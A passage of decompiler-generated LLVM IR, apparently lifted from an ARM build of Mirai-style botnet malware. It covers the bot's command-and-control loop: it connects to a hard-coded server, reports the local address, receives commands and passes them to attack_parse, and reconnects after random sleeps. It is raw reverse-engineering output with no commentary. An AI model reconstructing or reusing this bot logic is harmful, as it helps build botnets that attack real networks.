  %v2_d934 = ptrtoint i32* %stack_var_-72 to i32
  %v2_d97c = ptrtoint i32* %stack_var_-144 to i32
  %v2_dc3c = ptrtoint i8** %stack_var_-42 to i32
  %v2_dad8 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_dbd0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_dbd4 = ptrtoint i32* %stack_var_-56 to i32
  %v1_dc8c = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_dc50, %dec_label_pc_dc84, %bb45, %dec_label_pc_daf0, %dec_label_pc_da34, %dec_label_pc_da24, %bb42, %dec_label_pc_dd0c, %dec_label_pc_dcf0, %dec_label_pc_dcd8, %dec_label_pc_dc60, %dec_label_pc_dbf8, %dec_label_pc_db48, %dec_label_pc_d9d8, %dec_label_pc_d810
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d860

dec_label_pc_d860:                                ; preds = %dec_label_pc_d860, %dec_label_pc_d854
  %v1_d864 = phi i32 [ %v1_d868, %dec_label_pc_d860 ], [ 4, %dec_label_pc_d854 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d864 = load i32, i32* @r6, align 4
  %v3_d864 = add i32 %v2_d864, %v1_d864
  %v4_d864 = inttoptr i32 %v3_d864 to i32*
  store i32 0, i32* %v4_d864, align 4
  %v0_d868 = load i32, i32* %r3.global-to-local, align 4
  %v1_d868 = add i32 %v0_d868, 4
  store i32 %v1_d868, i32* %r3.global-to-local, align 4
  %v7_d86c = icmp eq i32 %v1_d868, 128
  br i1 %v7_d86c, label %dec_label_pc_d874, label %dec_label_pc_d860

dec_label_pc_d874:                                ; preds = %dec_label_pc_d860
  %v0_d874 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_d874, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d87c

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d87c, %dec_label_pc_d874
  %v1_d880 = phi i32 [ %v1_d884, %dec_label_pc_d87c ], [ 4, %dec_label_pc_d874 ]
  store i32 0, i32* @r4, align 4
  %v2_d880 = load i32, i32* @r7, align 4
  %v3_d880 = add i32 %v2_d880, %v1_d880
  %v4_d880 = inttoptr i32 %v3_d880 to i32*
  store i32 0, i32* %v4_d880, align 4
  %v0_d884 = load i32, i32* %r3.global-to-local, align 4
  %v1_d884 = add i32 %v0_d884, 4
  store i32 %v1_d884, i32* %r3.global-to-local, align 4
  %v7_d888 = icmp eq i32 %v1_d884, 128
  br i1 %v7_d888, label %dec_label_pc_d890, label %dec_label_pc_d87c

dec_label_pc_d890:                                ; preds = %dec_label_pc_d87c
  store i32 ptrtoint (i32* @global_var_21560.105 to i32), i32* %r3.global-to-local, align 4
  %v2_d894 = load i32, i32* @global_var_21560.105, align 4
  %v7_d898 = icmp eq i32 %v2_d894, -1
  br i1 %v7_d898, label %dec_label_pc_d8c8, label %dec_label_pc_d8a0

dec_label_pc_d8a0:                                ; preds = %dec_label_pc_d890
  %v3_d8a0 = udiv i32 %v2_d894, 32
  %v3_d8a8 = mul nuw nsw i32 %v3_d8a0, 4
  store i32 %v2_d6ec, i32* %ip.global-to-local, align 4
  %v2_d8b0 = add i32 %v3_d8a8, %v2_d6ec
  store i32 %v2_d8b0, i32* %r3.global-to-local, align 4
  %v1_d8b4 = add i32 %v2_d8b0, -224
  %v2_d8b4 = inttoptr i32 %v1_d8b4 to i32*
  %v3_d8b4 = load i32, i32* %v2_d8b4, align 4
  %v1_d8b8 = urem i32 %v2_d894, 32
  %v7_d8c0 = shl i32 1, %v1_d8b8
  %v8_d8c0 = or i32 %v3_d8b4, %v7_d8c0
  store i32 %v8_d8c0, i32* %r2.global-to-local, align 4
  store i32 %v8_d8c0, i32* %v2_d8b4, align 4
  br label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d890, %dec_label_pc_d8a0
  %v2_d8c8 = load i32, i32* @global_var_21564.101, align 4
  store i32 %v2_d8c8, i32* @r3, align 4
  %v7_d8cc = icmp eq i32 %v2_d8c8, -1
  store i32 ptrtoint (i32* @global_var_21564.101 to i32), i32* @r8, align 4
  br i1 %v7_d8cc, label %dec_label_pc_db54, label %dec_label_pc_d8d8

dec_label_pc_d8d8:                                ; preds = %dec_label_pc_db54, %dec_label_pc_d8c8, %bb44
  %v2_d8d8 = load i8, i8* bitcast (i8** @global_var_216e0.103 to i8*), align 4
  %v3_d8d8 = zext i8 %v2_d8d8 to i32
  store i32 %v3_d8d8, i32* %r3.global-to-local, align 4
  %v2_d8dc = icmp eq i8 %v2_d8d8, 0
  %v2_d9f4 = load i32, i32* @global_var_21564.101, align 4
  store i32 %v2_d9f4, i32* %ip.global-to-local, align 4
  %v3_d9fc = udiv i32 %v2_d9f4, 32
  br i1 %v2_d8dc, label %dec_label_pc_d9f4, label %dec_label_pc_d8e4

dec_label_pc_d8e4:                                ; preds = %dec_label_pc_d8d8
  %v3_d8f4 = mul nuw nsw i32 %v3_d9fc, 4
  %v2_d8f8 = add i32 %v3_d8f4, %v2_d6ec
  store i32 %v2_d8f8, i32* %r3.global-to-local, align 4
  %v1_d8fc = add i32 %v2_d8f8, -352
  %v2_d8fc = inttoptr i32 %v1_d8fc to i32*
  %v3_d8fc = load i32, i32* %v2_d8fc, align 4
  %v1_d900 = urem i32 %v2_d9f4, 32
  %v7_d908 = shl i32 1, %v1_d900
  %v8_d908 = or i32 %v3_d8fc, %v7_d908
  store i32 %v8_d908, i32* %r2.global-to-local, align 4
  store i32 %v8_d908, i32* %v2_d8fc, align 4
  br label %dec_label_pc_d910

dec_label_pc_d910:                                ; preds = %dec_label_pc_d9f4, %dec_label_pc_d8e4
  store i32 ptrtoint (i32* @global_var_21560.105 to i32), i32* %r3.global-to-local, align 4
  %v2_d914 = load i32, i32* @global_var_21560.105, align 4
  %v0_d918 = load i32, i32* %ip.global-to-local, align 4
  %v5_d91c = icmp slt i32 %v0_d918, %v2_d914
  br i1 %v5_d91c, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_d910
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_d910, %bb
  %v0_d938 = phi i32 [ %v2_d914, %dec_label_pc_d910 ], [ %v0_d918, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_d934, i32* %ip.global-to-local, align 4
  %v1_d938 = add i32 %v0_d938, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d850, i32* %r2.global-to-local, align 4
  %v5_d950 = call i32 @__libc_select(i32 %v1_d938, i32 %v2_d84c, i32 %v2_d850, i32 0, i32 %v2_d934)
  %v8_d954 = icmp eq i32 %v5_d950, -1
  br i1 %v8_d954, label %dec_label_pc_d854, label %dec_label_pc_d95c

dec_label_pc_d95c:                                ; preds = %bb42
  %v6_d950 = trunc i32 %v5_d950 to i16
  %v3_d95c = icmp eq i16 %v6_d950, 0
  br i1 %v3_d95c, label %dec_label_pc_d964, label %dec_label_pc_d990

dec_label_pc_d964:                                ; preds = %dec_label_pc_d95c
  %v2_d968 = load i32, i32* @sb, align 4
  %v5_d96c = srem i32 %v2_d968, 6
  %v4_d974 = sub i32 %v2_d968, %v5_d96c
  store i32 %v4_d974, i32* %r3.global-to-local, align 4
  store i32 %v5_d96c, i32* %r2.global-to-local, align 4
  %v2_d980 = icmp eq i32 %v5_d96c, 0
  %v7_d984 = inttoptr i32 %v5_d950 to i8*
  store i8* %v7_d984, i8** %stack_var_-42, align 4
  %v1_d988 = add i32 %v2_d968, 1
  store i32 %v1_d988, i32* @sb, align 4
  br i1 %v2_d980, label %dec_label_pc_dc34, label %dec_label_pc_d990

dec_label_pc_d990:                                ; preds = %dec_label_pc_d95c, %dec_label_pc_d964, %dec_label_pc_dc34
  %v2_d990 = load i8, i8* bitcast (i8** @global_var_216e0.103 to i8*), align 4
  %v3_d990 = zext i8 %v2_d990 to i32
  store i32 %v3_d990, i32* @r4, align 4
  %v2_d994 = icmp eq i8 %v2_d990, 0
  %v2_da24 = load i32, i32* @global_var_21564.101, align 4
  br i1 %v2_d994, label %dec_label_pc_da24, label %dec_label_pc_d99c

dec_label_pc_d99c:                                ; preds = %dec_label_pc_d990
  %v3_d9a4 = udiv i32 %v2_da24, 32
  store i32 %v2_d6ec, i32* %r2.global-to-local, align 4
  %v3_d9ac = mul nuw nsw i32 %v3_d9a4, 4
  %v2_d9b0 = add i32 %v3_d9ac, %v2_d6ec
  store i32 %v2_d9b0, i32* %r3.global-to-local, align 4
  %v1_d9b4 = add i32 %v2_d9b0, -352
  %v2_d9b4 = inttoptr i32 %v1_d9b4 to i32*
  %v3_d9b4 = load i32, i32* %v2_d9b4, align 4
  %v1_d9b8 = urem i32 %v2_da24, 32
  %v6_d9bc = ashr i32 %v3_d9b4, %v1_d9b8
  store i32 %v6_d9bc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_216e0.103 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d9c8 = urem i32 %v6_d9bc, 2
  %v2_d9c8 = icmp eq i32 %v1_d9c8, 0
  store i8 0, i8* bitcast (i8** @global_var_216e0.103 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_21564.101 to i32), i32* @r4, align 4
  br i1 %v2_d9c8, label %dec_label_pc_d9d8, label %dec_label_pc_dbc0

dec_label_pc_d9d8:                                ; preds = %dec_label_pc_d99c
  store i32 55776, i32* @lr, align 4
  %v1_d9dc = icmp ne i32 %v2_da24, -1
  call void @__pseudo_cond_branch(i1 %v1_d9dc, i32 ptrtoint (i32* @global_var_13d50.107 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d9e4 = load i32, i32* @r4, align 4
  %v2_d9e4 = inttoptr i32 %v1_d9e4 to i32*
  store i32 -1, i32* %v2_d9e4, align 4
  %v1_d9ec = call i32 @sleep(i32 1)
  br label %dec_label_pc_d854

dec_label_pc_d9f4:                                ; preds = %dec_label_pc_d8d8
  store i32 %v2_d6ec, i32* %r2.global-to-local, align 4
  %v3_da04 = mul nuw nsw i32 %v3_d9fc, 4
  %v2_da08 = add i32 %v3_da04, %v2_d6ec
  store i32 %v2_da08, i32* %r3.global-to-local, align 4
  %v1_da0c = add i32 %v2_da08, -224
  %v2_da0c = inttoptr i32 %v1_da0c to i32*
  %v3_da0c = load i32, i32* %v2_da0c, align 4
  %v1_da10 = urem i32 %v2_d9f4, 32
  %v7_da18 = shl i32 1, %v1_da10
  %v8_da18 = or i32 %v3_da0c, %v7_da18
  store i32 %v8_da18, i32* %r2.global-to-local, align 4
  store i32 %v8_da18, i32* %v2_da0c, align 4
  br label %dec_label_pc_d910

dec_label_pc_da24:                                ; preds = %dec_label_pc_d990
  %v7_da28 = icmp eq i32 %v2_da24, -1
  store i32 ptrtoint (i32* @global_var_21564.101 to i32), i32* @r8, align 4
  br i1 %v7_da28, label %dec_label_pc_d854, label %dec_label_pc_da34

dec_label_pc_da34:                                ; preds = %dec_label_pc_da24
  %v3_da34 = udiv i32 %v2_da24, 32
  store i32 %v2_d6ec, i32* %r2.global-to-local, align 4
  %v3_da40 = mul nuw nsw i32 %v3_da34, 4
  %v2_da44 = add i32 %v3_da40, %v2_d6ec
  store i32 %v2_da44, i32* %r3.global-to-local, align 4
  %v1_da48 = add i32 %v2_da44, -224
  %v2_da48 = inttoptr i32 %v1_da48 to i32*
  %v3_da48 = load i32, i32* %v2_da48, align 4
  %v1_da4c = urem i32 %v2_da24, 32
  %v6_da50 = ashr i32 %v3_da48, %v1_da4c
  store i32 %v6_da50, i32* %r2.global-to-local, align 4
  %v1_da54 = urem i32 %v6_da50, 2
  %v2_da54 = icmp eq i32 %v1_da54, 0
  br i1 %v2_da54, label %dec_label_pc_d854, label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %dec_label_pc_da34
  store i32 %v2_d97c, i32* %r3.global-to-local, align 4
  %v6_da60 = inttoptr i32 %v3_d990 to i8*
  store i8* %v6_da60, i8** %stack_var_-42, align 4
  %v0_da64 = call i32 @__GI___errno_location()
  %v0_da68 = load i32, i32* @r4, align 4
  %v2_da68 = inttoptr i32 %v0_da64 to i32*
  store i32 %v0_da68, i32* %v2_da68, align 4
  store i32 %v0_da64, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_da7c = load i32, i32* @global_var_21564.101, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_da88 = call i32 @__libc_recv(i32 %v2_da7c, i32 %v2_dc3c, i32 2, i32 16386)
  %v7_da8c = icmp eq i32 %v4_da88, -1
  br i1 %v7_da8c, label %dec_label_pc_dc50, label %dec_label_pc_da94

dec_label_pc_da94:                                ; preds = %dec_label_pc_da5c
  %v2_da94 = icmp eq i32 %v4_da88, 0
  br i1 %v2_da94, label %dec_label_pc_dc60, label %dec_label_pc_da9c

dec_label_pc_da9c:                                ; preds = %dec_label_pc_da94
  store i32 %v2_d97c, i32* %ip.global-to-local, align 4
  %v3_daa0 = load i8*, i8** %stack_var_-42, align 4
  %v4_daa0 = ptrtoint i8* %v3_daa0 to i32
  store i32 %v4_daa0, i32* %r3.global-to-local, align 4
  %v2_daa4 = icmp eq i8* %v3_daa0, null
  br i1 %v2_daa4, label %dec_label_pc_dcf0, label %dec_label_pc_daac

dec_label_pc_daac:                                ; preds = %dec_label_pc_da9c
  %v3_daac = udiv i32 %v4_daa0, 256
  %v1_dab0 = urem i32 %v4_daa0, 256
  store i32 %v1_dab0, i32* %r3.global-to-local, align 4
  %v4_dab4 = mul nuw nsw i32 %v1_dab0, 256
  %v5_dab4 = or i32 %v4_dab4, %v3_daac
  %v6_dab4 = trunc i32 %v5_dab4 to i16
  store i32 %v5_dab4, i32* %r2.global-to-local, align 4
  store i32 %v2_d97c, i32* @lr, align 4
  %v7_dac0 = inttoptr i32 %v5_dab4 to i8*
  store i8* %v7_dac0, i8** %stack_var_-42, align 4
  %tmp46 = icmp ugt i16 %v6_dab4, 1024
  br i1 %tmp46, label %dec_label_pc_dd0c, label %dec_label_pc_dac8

dec_label_pc_dac8:                                ; preds = %dec_label_pc_daac
  %v0_dac8 = load i32, i32* @r4, align 4
  %v1_dac8 = load i32, i32* @r5, align 4
  %v2_dac8 = inttoptr i32 %v1_dac8 to i32*
  store i32 %v0_dac8, i32* %v2_dac8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dad4 = load i32, i32* @global_var_21564.101, align 4
  %v7_dadc = call i32 @__libc_recv(i32 %v2_dad4, i32 %v2_dad8, i32 %v5_dab4, i32 16386)
  %v7_dae0 = icmp eq i32 %v7_dadc, -1
  br i1 %v7_dae0, label %dec_label_pc_dc50, label %dec_label_pc_dae8

dec_label_pc_dae8:                                ; preds = %dec_label_pc_dac8
  %v2_dae8 = icmp eq i32 %v7_dadc, 0
  br i1 %v2_dae8, label %dec_label_pc_dc60, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_dae8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_db00 = load i32, i32* @global_var_21564.101, align 4
  %v4_db04 = call i32 @__libc_recv(i32 %v2_db00, i32 %v2_dc3c, i32 2, i32 16384)
  %v3_db0c = load i8*, i8** %stack_var_-42, align 4
  %v4_db0c = ptrtoint i8* %v3_db0c to i32
  %v3_db10 = udiv i32 %v4_db0c, 256
  %v1_db14 = mul i32 %v4_db0c, 256
  %v4_db18 = and i32 %v1_db14, 65280
  %v5_db18 = or i32 %v4_db18, %v3_db10
  store i32 %v5_db18, i32* %ip.global-to-local, align 4
  store i32 %v2_d97c, i32* @lr, align 4
  store i32 %v5_db18, i32* %r2.global-to-local, align 4
  %v2_db28 = load i32, i32* @global_var_21564.101, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_db30 = inttoptr i32 %v5_db18 to i8*
  store i8* %v6_db30, i8** %stack_var_-42, align 4
  %v6_db34 = call i32 @__libc_recv(i32 %v2_db28, i32 %v2_dad8, i32 %v5_db18, i32 16384)
  store i32 %v2_d97c, i32* %r2.global-to-local, align 4
  %v3_db3c = load i8*, i8** %stack_var_-42, align 4
  %v3_db40 = icmp eq i8* %v3_db3c, null
  br i1 %v3_db40, label %dec_label_pc_d854, label %dec_label_pc_db48

dec_label_pc_db48:                                ; preds = %dec_label_pc_daf0
  %v4_db3c = ptrtoint i8* %v3_db3c to i32
  %v5_db4c = call i32 @attack_parse(i32* nonnull %stack_var_-1416, i32 %v4_db3c, i32 %v2_d97c)
  br label %dec_label_pc_d854

dec_label_pc_db54:                                ; preds = %dec_label_pc_d8c8
  %v0_db5c = load i32, i32* @r4, align 4
  store i32 %v0_db5c, i32* %r2.global-to-local, align 4
  %v3_db60 = call i32 @socket(i32 2, i32 1, i32 %v0_db5c)
  %v7_db64 = icmp eq i32 %v3_db60, -1
  store i32 %v3_db60, i32* @r5, align 4
  %v1_db6c = load i32, i32* @r8, align 4
  %v2_db6c = inttoptr i32 %v1_db6c to i32*
  store i32 %v3_db60, i32* %v2_db6c, align 4
  br i1 %v7_db64, label %dec_label_pc_d8d8, label %dec_label_pc_db74

dec_label_pc_db74:                                ; preds = %dec_label_pc_db54
  %v0_db74 = load i32, i32* @r4, align 4
  store i32 %v0_db74, i32* @r2, align 4
  %v2_db7c = call i32 @__libc_fcntl(i32 %v3_db60, i32 3)
  %v1_db84 = or i32 %v2_db7c, 2048
  store i32 %v1_db84, i32* @r2, align 4
  %v0_db88 = load i32, i32* @r5, align 4
  %v2_db8c = call i32 @__libc_fcntl(i32 %v0_db88, i32 4)
  %v2_db94 = load i32, i32* @global_var_21568.83, align 4
  store i32 %v2_db94, i32* %r3.global-to-local, align 4
  %v2_db98 = icmp eq i32 %v2_db94, 0
  br i1 %v2_db98, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_db74
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_db74, %bb43
  %v2_dba0 = xor i1 %v2_db98, true
  call void @__pseudo_cond_branch(i1 %v2_dba0, i32 ptrtoint (i32* @global_var_101fc.108 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_dba8 = load i32, i32* @global_var_21564.101, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v2_dbb4 = load i32, i32* @fp, align 4
  %v3_dbb4 = inttoptr i32 %v2_dbb4 to i8*
  store i8 1, i8* %v3_dbb4, align 1
  %v4_dbb8 = call i32 @__libc_connect(i32 %v2_dba8, i32 ptrtoint (i16** @global_var_241fc.87 to i32), i32 16)
  br label %dec_label_pc_d8d8

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_d99c
  store i32 4, i32* @r5, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_dbd0, i32* %r3.global-to-local, align 4
  store i32 %v2_dbd4, i32* %ip.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_dbe8 = call i32 @getsockopt(i32 %v2_da24, i32 1, i32 4, i32 %v2_dbd0, i32 %v2_dbd4)
  %v3_dbec = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_dbec, i32* %r3.global-to-local, align 4
  %v2_dbf0 = icmp eq i32 %v3_dbec, 0
  br i1 %v2_dbf0, label %dec_label_pc_dc84, label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %dec_label_pc_dbc0
  %v2_dbf8 = load i32, i32* @global_var_21564.101, align 4
  %v1_dbfc = call i32 @__GI___libc_close(i32 %v2_dbf8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dc04 = load i32, i32* @r4, align 4
  %v2_dc04 = inttoptr i32 %v1_dc04 to i32*
  store i32 -1, i32* %v2_dc04, align 4
  %v0_dc08 = call i32 @rand_next()
  %v3_dc10 = zext i32 %v0_dc08 to i64
  %v4_dc10 = mul nuw i64 %v3_dc10, 3435973837
  %v7_dc10 = trunc i64 %v4_dc10 to i32
  store i32 %v7_dc10, i32* @lr, align 4
  %v3_dc142 = udiv i64 %v4_dc10, 34359738368
  %v3_dc184 = mul nuw nsw i64 %v3_dc142, 8
  %v3_dc18 = trunc i64 %v3_dc184 to i32
  store i32 %v3_dc18, i32* %r2.global-to-local, align 4
  %v2_dc1c6 = mul nuw nsw i64 %v3_dc142, 2
  %v2_dc1c = trunc i64 %v2_dc1c6 to i32
  %v2_dc20 = add i32 %v3_dc18, %v2_dc1c
  store i32 %v2_dc20, i32* %r3.global-to-local, align 4
  %v2_dc24 = sub i32 %v0_dc08, %v2_dc20
  %v1_dc28 = add i32 %v2_dc24, 1
  %v1_dc2c = call i32 @sleep(i32 %v1_dc28)
  br label %dec_label_pc_d854

dec_label_pc_dc34:                                ; preds = %dec_label_pc_d964
  %v2_dc38 = load i32, i32* @global_var_21564.101, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dc48 = call i32 @__libc_send(i32 %v2_dc38, i32 %v2_dc3c, i32 2, i32 16384)
  br label %dec_label_pc_d990

dec_label_pc_dc50:                                ; preds = %dec_label_pc_dac8, %dec_label_pc_da5c
  %v0_dc50 = load i32, i32* @r5, align 4
  %v1_dc50 = inttoptr i32 %v0_dc50 to i32*
  %v2_dc50 = load i32, i32* %v1_dc50, align 4
  store i32 %v2_dc50, i32* %r3.global-to-local, align 4
  %v7_dc54 = icmp eq i32 %v2_dc50, 4
  br i1 %v7_dc54, label %dec_label_pc_d854, label %bb45

bb45:                                             ; preds = %dec_label_pc_dc50
  %v8_dc58 = icmp eq i32 %v2_dc50, 11
  br i1 %v8_dc58, label %dec_label_pc_d854, label %dec_label_pc_dc60

dec_label_pc_dc60:                                ; preds = %bb45, %dec_label_pc_dae8, %dec_label_pc_da94
  %v2_dc60 = load i32, i32* @global_var_21564.101, align 4
  store i32 56428, i32* @lr, align 4
  %v1_dc68 = icmp ne i32 %v2_dc60, -1
  call void @__pseudo_cond_branch(i1 %v1_dc68, i32 ptrtoint (i32* @global_var_13d50.107 to i32))
  store i32 ptrtoint (i32* @global_var_21564.101 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_21564.101, align 4
  %v1_dc7c = call i32 @sleep(i32 1)
  br label %dec_label_pc_d854

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dbc0
  %v2_dc8c = call i32 @util_strlen(i8* %v1_dc8c)
  %sext = mul i32 %v2_dc8c, 16777216
  %v1_dc90 = sdiv i32 %sext, 16777216
  %v7_dc90 = inttoptr i32 %v1_dc90 to i8*
  store i8* %v7_dc90, i8** %stack_var_-42, align 4
  %v0_dc94 = call i32 @util_local_addr()
  %v0_dc9c = load i32, i32* @r5, align 4
  store i32 %v0_dc9c, i32* %r2.global-to-local, align 4
  store i32 %v0_dc94, i32* @global_var_241f0.57, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_dcac = load i32, i32* @global_var_21564.101, align 4
  %v4_dcb0 = call i32 @__libc_send(i32 %v2_dcac, i32 ptrtoint (i32* @global_var_18d80.111 to i32), i32 %v0_dc9c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_dcbc = load i32, i32* @global_var_21564.101, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_dcc8 = call i32 @__libc_send(i32 %v2_dcbc, i32 %v2_dc3c, i32 1, i32 16384)
  %v3_dccc = load i8*, i8** %stack_var_-42, align 4
  %v4_dccc = ptrtoint i8* %v3_dccc to i32
  store i32 %v4_dccc, i32* %r2.global-to-local, align 4
  %v3_dcd0 = icmp eq i8* %v3_dccc, null
  br i1 %v3_dcd0, label %dec_label_pc_d854, label %dec_label_pc_dcd8

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dc84
  %v2_dcdc = load i32, i32* @global_var_21564.101, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_dce8 = call i32 @__libc_send(i32 %v2_dcdc, i32 %v2_d690, i32 %v4_dccc, i32 16384)
  br label %dec_label_pc_d854

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_da9c
  %v2_dcf4 = load i32, i32* @global_var_21564.101, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_dd00 = add i32 %v4_daa0, 16384
  store i32 %v1_dd00, i32* %r3.global-to-local, align 4
  %v4_dd04 = call i32 @__libc_recv(i32 %v2_dcf4, i32 %v2_dc3c, i32 2, i32 %v1_dd00)
  br label %dec_label_pc_d854

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_daac
  %v2_dd0c = load i32, i32* @global_var_21564.101, align 4
  %v1_dd10 = call i32 @__GI___libc_close(i32 %v2_dd0c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd18 = load i32, i32* @r8, align 4
  %v2_dd18 = inttoptr i32 %v1_dd18 to i32*
  store i32 -1, i32* %v2_dd18, align 4
  br label %dec_label_pc_d854

; uselistorder directives
  uselistorder i32 %v3_db60, { 1, 3, 2, 0 }
  uselistorder i8* %v3_db3c, { 1, 0 }
  uselistorder i32 %v5_db18, { 1, 0, 2, 3 }
  uselistorder i32 %v7_dadc, { 1, 0 }
  uselistorder i32 %v5_dab4, { 1, 0, 3, 2 }
  uselistorder i32 %v4_daa0, { 2, 1, 0, 3 }
  uselistorder i32 %v4_da88, { 1, 0 }
  uselistorder i32 %v2_da24, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_d96c, { 1, 0, 2 }
  uselistorder i32 %v2_d968, { 2, 0, 1 }
  uselistorder i32 %v5_d950, { 1, 2, 0 }
  uselistorder i32 %v2_d894, { 2, 1, 0 }
  uselistorder i32 %v1_d884, { 1, 2, 0 }
  uselistorder i32 %v1_d868, { 1, 2, 0 }
  uselistorder i32 %v2_dc3c, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_d97c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_d850, { 1, 0, 2 }
  uselistorder i32 %v2_d6ec, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_d6d4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 3, 4, 7, 8 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_216e0.103 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_216e0.103, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_216e0.103 to i32), { 1, 0 }
  uselistorder i32* @global_var_21564.101, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_21568.83, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d4bc.81 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_241fc.87 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_d990, { 2, 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_d8d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d8c8, { 1, 0 }
  uselistorder label %dec_label_pc_d854, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d6a4, { 2, 0, 1 }
}

define i32 @function_dd48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dd48:
  %v0_dd48 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_dd48, i32 -22312964)
  %v0_dd50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dd50, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_dd48
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_dd48, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_dd60 = load i32, i32* @global_var_216e4.113, align 4
  %v2_dd64 = load i32, i32* @global_var_216f0.115, align 4
  %v4_dd70 = mul i32 %v2_dd60, 2048
  %v5_dd70 = xor i32 %v4_dd70, %v2_dd60
  store i32 %v5_dd70, i32* @r3, align 4
  %v4_dd74 = udiv i32 %v2_dd64, 524288
  %v5_dd74 = xor i32 %v4_dd74, %v2_dd64
  %v2_dd78 = load i32, i32* @global_var_216e8.117, align 4
